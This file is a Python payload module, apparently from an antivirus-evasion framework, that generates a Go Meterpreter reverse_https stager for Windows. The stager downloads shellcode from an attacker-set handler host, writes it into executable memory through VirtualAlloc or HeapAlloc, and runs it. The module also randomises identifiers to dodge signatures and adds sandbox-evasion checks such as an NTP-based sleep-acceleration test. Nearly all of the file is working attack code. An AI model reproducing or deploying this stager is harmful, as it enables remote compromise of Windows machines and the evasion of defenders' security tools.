"""

Custom-written pure go meterpreter/reverse_https stager.


Module built by @b00stfr3ak44
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from random import randint


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "go"
        self.extension = "go"
        self.rating = "Normal"
        self.name = "Pure Golang Reverse HTTPS Stager"
        self.path = "go/meterpreter/rev_https"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "IP of the Metasploit handler"],
            "LPORT"          : ["80", "Port of the Metasploit handler"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def system_checks(self):
        rand_username = evasion_helpers.randomString()
        rand_error1 = evasion_helpers.randomString()
        rand_hostname = evasion_helpers.randomString()
        rand_error2 = evasion_helpers.randomString()
        rand_processor = evasion_helpers.randomString()
        rand_domain = evasion_helpers.randomString()
        rand_error3 = evasion_helpers.randomString()
        num_ends = 0
        check_code = ''

        if self.required_options["USERNAME"][0].lower() != "x":
            check_code += rand_username + ", " + rand_error1 + " := user.Current()\n"
            check_code += "if " + rand_error1 + " != nil {\n"
            check_code += "os.Exit(1)}\n"
            check_code += "if strings.Contains(strings.ToLower(" + rand_username + ".Username), strings.ToLower(\"" + self.required_options["USERNAME"][0] + "\")) {\n"
            num_ends += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":
            check_code += rand_hostname + ", " + rand_error2 + " := os.Hostname()\n"
            check_code += "if " + rand_error2 + " != nil {\n"
            check_code += "os.Exit(1)}\n"
            check_code += "if strings.Contains(strings.ToLower(" + rand_hostname + "), strings.ToLower(\"" + self.required_options["HOSTNAME"][0] + "\")) {\n"
            num_ends += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":
            check_code += rand_processor + " := runtime.NumCPU()\n"
            check_code += "if " + rand_processor + " >= " + self.required_options["PROCESSORS"][0] + " {\n"
            num_ends += 1

        if self.required_options["SLEEP"][0].lower() != "x":
            check_code += 'type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}\n'
            check_code += 'sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()\n'
            check_code += 'ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b\n'
            check_code += 'binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)\n'
            check_code += 'val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))\n'
            check_code += 'time.Sleep(time.Duration(' + self.required_options["SLEEP"][0] + '*1000) * time.Millisecond)\n'
            check_code += 'newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()\n'
            check_code += 'second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b\n'
            check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
            check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + self.required_options["SLEEP"][0] + ' {'
            num_ends += 1

        return check_code, num_ends

    def generate(self):
        memCommit = evasion_helpers.randomString()
        memReserve = evasion_helpers.randomString()
        pageExecRW = evasion_helpers.randomString()
        kernel32 = evasion_helpers.randomString()
        procVirtualAlloc = evasion_helpers.randomString()
        base64Url = evasion_helpers.randomString()
        virtualAlloc = evasion_helpers.randomString()
        size = evasion_helpers.randomString()
        allocvarout = evasion_helpers.randomString()
        err = evasion_helpers.randomString()
        randBase = evasion_helpers.randomString()
        length = evasion_helpers.randomString()
        foo = evasion_helpers.randomString()
        random = evasion_helpers.randomString()
        outp = evasion_helpers.randomString()
        i = evasion_helpers.randomString()
        randTextBase64URL = evasion_helpers.randomString()
        getURI = evasion_helpers.randomString()
        sumVar = evasion_helpers.randomString()
        checksum8 = evasion_helpers.randomString()
        uri = evasion_helpers.randomString()
        value = evasion_helpers.randomString()
        tr = evasion_helpers.randomString()
        client = evasion_helpers.randomString()
        hostAndPort = evasion_helpers.randomString()
        port = self.required_options["LPORT"][0]
        host = self.required_options["LHOST"][0]
        response = evasion_helpers.randomString()
        uriLength = randint(5, 255)
        payload = evasion_helpers.randomString()
        bufferVar = evasion_helpers.randomString()
        x = evasion_helpers.randomString()
        heapcreatevariable = evasion_helpers.randomString()
        heapallocvariable = evasion_helpers.randomString()
        heapcreateout = evasion_helpers.randomString()
        cust_func = evasion_helpers.randomString()
        errorvariable = evasion_helpers.randomString()
        errorvariabledos = evasion_helpers.randomString()

        # sandbox check code
        sandbox_checks, num_curlys = self.system_checks()

        # Todo: randomize import order
        payload_code = "package main\nimport (\n\"syscall\"\n\"unsafe\"\n"
        payload_code += "\"io/ioutil\"\n\"math/rand\"\n\"net/http\"\n\"time\"\n\"crypto/tls\"\n"

        if self.required_options["PROCESSORS"][0].lower() != "x":
            payload_code += "\"runtime\"\n"

        # Add in other imports based on checks being performed
        if self.required_options["USERNAME"][0].lower() != "x":
            payload_code += "\"strings\"\n\"os\"\n\"os/user\"\n"
        if self.required_options["HOSTNAME"][0].lower() != "x":
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
            if "os" not in payload_code:
                payload_code += "\"os\"\n"
        if self.required_options["SLEEP"][0].lower() != "x":
            payload_code += "\"net\"\n\"time\"\n\"encoding/binary\"\n"

        payload_code += ")\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "const (\n"
            payload_code += "%s  = 0x1000\n" % (memCommit)
            payload_code += "%s = 0x2000\n" % (memReserve)
            payload_code += "%s  = 0x40\n)\n" % (pageExecRW)

        payload_code += "var (\n"
        payload_code += "%s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\"\n" %(base64Url)

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s = syscall.NewLazyDLL(\"kernel32.dll\")\n" % (kernel32)
            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" % (procVirtualAlloc, kernel32)
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
            payload_code += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" % (allocvarout, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += kernel32 + " = syscall.NewLazyDLL(\"kernel32.dll\")\n"
            payload_code += heapcreatevariable + " = " + kernel32 + ".NewProc(\"HeapCreate\")\n"
            payload_code += heapallocvariable + " = " + kernel32 + ".NewProc(\"HeapAlloc\")\n)\n"
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
            payload_code += heapcreateout + ", _, " + errorvariable + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
            payload_code += allocvarout + ", _, " + errorvariabledos + " := " + heapallocvariable + ".Call(" + heapcreateout + ", 0x00000008, " + size + ")\n"
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)

        payload_code += "func %s(%s int, %s []byte) string {\n" % (randBase, length, foo)
        payload_code += "%s := rand.New(rand.NewSource(time.Now().UnixNano()))\n" % (random)
        payload_code += "var %s []byte\n" % (outp)
        payload_code += "for %s := 0; %s < %s; %s++ {\n" % (i, i, length, i)
        payload_code += "%s = append(%s, %s[%s.Intn(len(%s))])\n}\n" % (outp, outp, foo, random, foo)
        payload_code += "return string(%s)\n}\n" % (outp)

        payload_code += "func %s(%s int) string {\n" % (randTextBase64URL, length)
        payload_code += "%s := []byte(%s)\n" % (foo, base64Url)
        payload_code += "return %s(%s, %s)\n}\n" % (randBase, length, foo)

        payload_code += "func %s(%s, %s int) string {\n" % (getURI, sumVar, length)
        payload_code += "for {\n%s := 0\n%s := %s(%s)\n" % (checksum8, uri, randTextBase64URL, length)
        payload_code += "for _, %s := range []byte(%s) {\n%s += int(%s)\n}\n" % (value, uri, checksum8, value)
        payload_code += "if %s%s == %s {\nreturn \"/\" + %s\n}\n}\n}\n" % (checksum8, '%0x100', sumVar, uri)

        payload_code += "func main() {\n"
        # Sandbox code goes here
        if sandbox_checks != '':
            payload_code += sandbox_checks
        payload_code += "%s := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}\n" %(tr)
        payload_code += "%s := http.Client{Transport: %s}\n" % (client, tr)
        payload_code += "%s := \"https://%s:%s\"\n" % (hostAndPort, host, port)
        payload_code += "%s, _ := %s.Get(%s + %s(92, %s))\n" % (response, client, hostAndPort, getURI, uriLength)
        payload_code += "defer %s.Body.Close()\n" % (response)
        payload_code += "%s, _ := ioutil.ReadAll(%s.Body)\n" % (payload, response)
        payload_code += "%s, _ := %s(uintptr(len(%s)))\n" % (allocvarout, cust_func, payload)
        payload_code += "%s := (*[990000]byte)(unsafe.Pointer(%s))\n" % (bufferVar, allocvarout)
        payload_code += "for %s, %s := range %s {\n" %(x, value, payload)
        payload_code += "%s[%s] = %s\n}\n" % (bufferVar, x, value)
        payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (allocvarout)
        payload_code += '}' * num_curlys

        self.payload_source_code = payload_code
        return
